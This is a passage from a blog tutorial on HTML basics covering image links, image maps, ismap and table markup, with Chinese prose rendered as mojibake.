attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/html5.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span></code></pre><img src="/2020/02/14/FrontEnd_HTML_Basic/html5.jpg" width="50" height="50"><img src="/2020/02/14/FrontEnd_HTML_Basic/html5.jpg" width="100" height="100"><img src="/2020/02/14/FrontEnd_HTML_Basic/html5.jpg" width="200" height="200"><h3 id="å›¾åƒé“¾æ¥"><a href="#å›¾åƒé“¾æ¥" class="headerlink" title="å›¾åƒé“¾æ¥"></a>å›¾åƒé“¾æ¥</h3><p>å°†ä¸€ä¸ªå›¾åƒå½“ä½œé“¾æ¥ä½¿ç”¨ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://miaotony.xyz<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/html5.jpg<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span></code></pre><p>æ¯”å¦‚ç‚¹ä¸€ç‚¹è¿™ä¸ªå°±åˆ°è¾¾æˆ‘çš„åšå®¢ä¸»é¡µäº†â†’ <a href="https://miaotony.xyz"><img src="/2020/02/14/FrontEnd_HTML_Basic/html5.jpg"></a></p><p><em>ï¼ˆæœ‰å¯èƒ½è¢«hexoä¼˜åŒ–æ‰emmm</em></p><h3 id="åˆ›å»ºå›¾åƒæ˜ å°„"><a href="#åˆ›å»ºå›¾åƒæ˜ å°„" class="headerlink" title="åˆ›å»ºå›¾åƒæ˜ å°„"></a>åˆ›å»ºå›¾åƒæ˜ å°„</h3><p>åˆ›å»ºå¸¦æœ‰å¯ä¾›ç‚¹å‡»åŒºåŸŸçš„å›¾åƒåœ°å›¾ã€‚å…¶ä¸­çš„æ¯ä¸ªåŒºåŸŸéƒ½æ˜¯ä¸€ä¸ªè¶…çº§é“¾æ¥ã€‚</p><p><code>img</code> å…ƒç´ ä¸­çš„ â€œusemapâ€ å±æ€§å¼•ç”¨ <code>map</code> å…ƒç´ ä¸­çš„ â€œidâ€ æˆ– â€œnameâ€ å±æ€§ï¼ˆæ ¹æ®æµè§ˆå™¨ï¼‰</p><p>å›¾ç‰‡å·¦ä¸Šè§’åæ ‡ä¸º (0,0)ï¼Œå³ä¸‹è§’ä¸º (x,y)ï¼Œå·¦å¾€å³ä¸ºxè½´æ­£æ–¹å‘ï¼Œä¸Šå¾€ä¸‹ä¸ºyè½´æ­£æ–¹å‘ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span><span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.w3school.com.cn/i/eg_planets.jpg<span class="token punctuation">"</span></span><span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">usemap</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#planetmap<span class="token punctuation">"</span></span><span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Planets<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>map</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>planetmap<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>planetmap<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>area</span><span class="token attr-name">shape</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>circle<span class="token punctuation">"</span></span><span class="token attr-name">coords</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>180,139,14<span class="token punctuation">"</span></span><span class="token attr-name">href</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.w3school.com.cn/example/html/venus.html<span class="token punctuation">"</span></span><span class="token attr-name">target</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Venus<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>area</span><span class="token attr-name">shape</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>circle<span class="token punctuation">"</span></span><span class="token attr-name">coords</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>129,161,10<span class="token punctuation">"</span></span><span class="token attr-name">href</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.w3school.com.cn/example/html/mercur.html<span class="token punctuation">"</span></span><span class="token attr-name">target</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Mercury<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>area</span><span class="token attr-name">shape</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>rect<span class="token punctuation">"</span></span><span class="token attr-name">coords</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0,0,110,260<span class="token punctuation">"</span></span><span class="token attr-name">href</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.w3school.com.cn/example/html/sun.html<span class="token punctuation">"</span></span><span class="token attr-name">target</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Sun<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>map</span><span class="token punctuation">&gt;</span></span></code></pre><p>å…¶ä¸­<code>&lt;map&gt;</code>ç”¨æ¥å®šä¹‰å›¾åƒåœ°å›¾ï¼Œ<code>&lt;area&gt;</code>ç”¨æ¥å®šä¹‰å›¾åƒåœ°å›¾ä¸­çš„å¯ç‚¹å‡»åŒºåŸŸã€‚</p><p>ç‚¹å‡»å¯¹åº”çš„åŒºåŸŸä¼šè·³è½¬åˆ°ä¸åŒçš„é¡µé¢ã€‚*<del>ï¼ˆé“¾æ¥æœ‰å¯èƒ½è¢«hexoä¼˜åŒ–æ‰emmm</del>*è¿˜æ˜¯å¯ä»¥ç‚¹çš„</p><p><img src="https://www.w3school.com.cn/i/eg_planets.jpg" border="0" usemap="#planetmap" alt="Planets"></p><map name="planetmap" id="planetmap"><area shape="circle" coords="180,139,14" href="https://www.w3school.com.cn/example/html/venus.html" target="_blank" alt="Venus"><area shape="circle" coords="129,161,10" href="https://www.w3school.com.cn/example/html/mercur.html" target="_blank" alt="Mercury"><area shape="rect" coords="0,0,110,260" href="https://www.w3school.com.cn/example/html/sun.html" target="_blank" alt="Sun"></map><h3 id="å°†å›¾åƒè½¬æ¢ä¸ºå›¾åƒæ˜ å°„"><a href="#å°†å›¾åƒè½¬æ¢ä¸ºå›¾åƒæ˜ å°„" class="headerlink" title="å°†å›¾åƒè½¬æ¢ä¸ºå›¾åƒæ˜ å°„"></a>å°†å›¾åƒè½¬æ¢ä¸ºå›¾åƒæ˜ å°„</h3><p>æŠŠä¸€å¹…æ™®é€šçš„å›¾åƒè®¾ç½®ä¸ºå›¾åƒæ˜ å°„ã€‚åŠ å…¥<code>ismap</code> å±æ€§ï¼Œå³å¯è·å¾—å›¾ç‰‡çš„åæ ‡ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/html_ismap.html<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/planets.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">ismap</span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span></code></pre><p>å¦‚æœç‚¹å‡» (12,34)ï¼Œåˆ™ä¼šè®¿é—®<code>/html_ismap.html?12,34</code>.</p><br><h2 id="è¡¨æ ¼"><a href="#è¡¨æ ¼" class="headerlink" title="è¡¨æ ¼"></a>è¡¨æ ¼</h2><p>æ¯ä¸ªè¡¨æ ¼ç”± <code>table</code> æ ‡ç­¾å¼€å§‹ã€‚æ¯ä¸ªè¡¨æ ¼è¡Œç”± <code>tr</code> æ ‡ç­¾ (table row) å¼€å§‹ã€‚æ¯ä¸ªè¡¨æ ¼æ•°æ®ç”± <code>td</code> æ ‡ç­¾ (table data) å¼€å§‹ï¼Œå³æ•°æ®å•å…ƒæ ¼çš„å†…å®¹ã€‚</p><p>æ•°æ®å•å…ƒæ ¼å¯ä»¥åŒ…å«æ–‡æœ¬ã€å›¾ç‰‡ã€åˆ—è¡¨ã€æ®µè½ã€è¡¨å•ã€æ°´å¹³çº¿ã€è¡¨æ ¼ç­‰ç­‰ã€‚</p><p><em>ï¼ˆè¿™é‡Œåœ¨åšå®¢ä¸Šå¯èƒ½å¾ˆå¤šæ˜¾ç¤ºä¸æ­£å¸¸ï¼Œå› ä¸ºå¦å¤–æœ‰CSSæ ·å¼å¯¹å…¨å±€è¡¨æ ¼è¿›è¡Œäº†å®šä¹‰</em></p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>row 1, cell 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>row 1, cell 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>row 2, cell 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>row 2, cell 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span></code></pre><table>    <tbody><tr>        <td>row 1, cell 1</td>        <td>row 1, cell 2</td>    </tr>    <tr>        <td>row 2, cell 1</td>        <td>row 2, cell 2</td>    </tr></tbody></table><h3 id="è¾¹æ¡†"><a href="#è¾¹æ¡†" class="headerlink" title="è¾¹æ¡†"></a>è¾¹æ¡†</h3><p>borderå±æ€§</p><p>ä¸Šé¢çš„ä¾‹å­æ²¡æœ‰è¾¹æ¡†ï¼Œæˆ–è€…è®¾ç½®<code>&lt;table border="0"&gt;</code>ã€‚</p><p>å¸¦æœ‰æ™®é€šçš„è¾¹æ¡†ï¼š</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>First<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>Second<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span></code></pre><table border="1">    <tbody><tr>        <td>First</td>        <td>Row</td>    </tr>       <tr>        <td>Second</td>        <td>Row</td>    </tr></tbody></table><p>ç²—çš„è¾¹æ¡†ï¼ˆå¢å¤§<code>border</code>ï¼‰ï¼š</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span></code></pre><table border="10">    <tbody><tr>        <td>First</td>        <td>Row</td>    </tr>       <tr>        <td>Second</td>        <td>Row</td>    </tr></tbody></table><h3 id="è¡¨å¤´"><a href="#è¡¨å¤´" class="headerlink" title="è¡¨å¤´"></a>è¡¨å¤´</h3><p><code>th</code>æ ‡ç­¾</p><p>å¤§å¤šæ•°æµè§ˆå™¨ä¼šæŠŠè¡¨å¤´æ˜¾ç¤ºä¸ºç²—ä½“å±…ä¸­çš„æ–‡æœ¬</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>Heading<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>Another Heading<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>row 1, cell 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>row 1, cell 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>row 2, cell 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>row 2, cell 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span></code></pre><table border="1">    <tbody><tr>        <th>Heading</th>        <th>Another Heading</th>    </tr>    <tr>        <td>row 1, cell 1</td>        <td>row 1, cell 2</td>    </tr>    <tr>        <td>row 2, cell 1</td>        <td>row 2, cell 2</td>    </tr></tbody></table><p>ä¸‹é¢æ˜¯å‚ç›´çš„è¡¨å¤´ï¼š</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>å§“å<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>Miao<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>ç”µè¯<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>ç”µè¯<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>654321<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span></code></pre><table border="1">    <tbody><tr>        <th>å§“å</th>        <td>Miao</td>    </tr>    <tr>        <th>ç”µè¯</th>        <td>123456</td>    </tr>    <tr>        <th>ç”µè¯</th>        <td>654321</td>    </tr></tbody></table><h3 id="ç©ºå•å…ƒæ ¼"><a href="#ç©ºå•å…ƒæ ¼" class="headerlink" title="ç©ºå•å…ƒæ ¼"></a>ç©ºå•å…ƒæ ¼</h3><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>row 1, cell 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>row 1, cell 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>row 2, cell 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span></code></pre><table border="1"><tbody><tr><td>row 1, cell 1</td><td>row 1, cell 2</td></tr><tr><td></td><td>row 2, cell 2</td></tr></tbody></table><p>è¿™ä¸ªç©ºçš„å•å…ƒæ ¼çš„è¾¹æ¡†å¯èƒ½æ²¡æœ‰è¢«æ˜¾ç¤ºå‡ºæ¥ã€‚ä¸ºäº†é¿å…è¿™ç§æƒ…å†µï¼Œåœ¨ç©ºå•å…ƒæ ¼ä¸­æ·»åŠ ä¸€ä¸ªç©ºæ ¼å ä½ç¬¦ï¼ˆ<code>&amp;nbsp;</code>)ï¼Œå°±å¯ä»¥å°†è¾¹æ¡†æ˜¾ç¤ºå‡ºæ¥ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>row 1, cell 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>row 1, cell 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&nbsp;">&amp;nbsp;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>row 2, cell 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span></code></pre><table border="1">    <tbody><tr>        <td>row 1, cell 1</td>        <td>row 1, cell 2</td>    </tr>    <tr>        <td>&nbsp;</td>        <td>row 2, cell 2</td>    </tr></tbody></table><h3 id="è¡¨çš„æ ‡é¢˜"><a href="#è¡¨çš„æ ‡é¢˜" class="headerlink" title="è¡¨çš„æ ‡é¢˜"></a>è¡¨çš„æ ‡é¢˜</h3><p><code>caption</code>æ ‡ç­¾</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>6<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>caption</span><span class="token punctuation">&gt;</span></span>è¿™æ˜¯æ ‡é¢˜<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>caption</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>200<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>300<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>400<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>500<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>600<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span></code></pre><table border="6">    <caption>è¿™æ˜¯æ ‡é¢˜</caption>    <tbody><tr>        <td>100</td>        <td>200</td>        <td>300</td>    </tr>    <tr>        <td>400</td>        <td>500</td>        <td>600</td>    </tr></tbody></table><h3 id="å•å…ƒæ ¼è·¨è¡Œè·¨åˆ—"><a href="#å•å…ƒæ 